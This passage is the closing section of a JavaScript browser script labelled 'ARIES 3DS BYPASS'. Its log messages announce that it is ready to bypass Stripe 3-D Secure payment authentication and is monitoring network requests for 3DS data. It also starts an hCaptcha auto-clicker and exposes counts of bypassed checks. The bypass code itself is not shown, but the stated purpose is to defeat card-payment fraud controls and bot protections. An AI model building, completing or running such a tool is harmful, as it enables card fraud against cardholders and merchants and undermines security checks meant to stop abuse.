  console.log('%c[ARIES 3DS BYPASS] Core loaded and active - Ready to bypass 3DS!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
  console.log('%c[ARIES 3DS BYPASS] Monitoring all network requests for Stripe 3DS data...', 'color: #22c55e; font-size: 12px;');

  // Start hCaptcha auto-clicker
  initHCaptchaAutoClicker();

  // Console indicator that both bypass and captcha clicker are loaded
    console.log('%c🛡️ ARIES 3DS + CAPTCHA ACTIVE (MULTI-CLICK)%c', 'color: #22c55e; font-weight: bold; background: #000; padding: 5px;', '');

  console.log('[ARIES 3DS BYPASS] Ready and active');

  // Expose stats for debugging
  window.__ARIES_3DS_STATS__ = () => ({ bypassed: bypassCount, detected: detectCount });

})();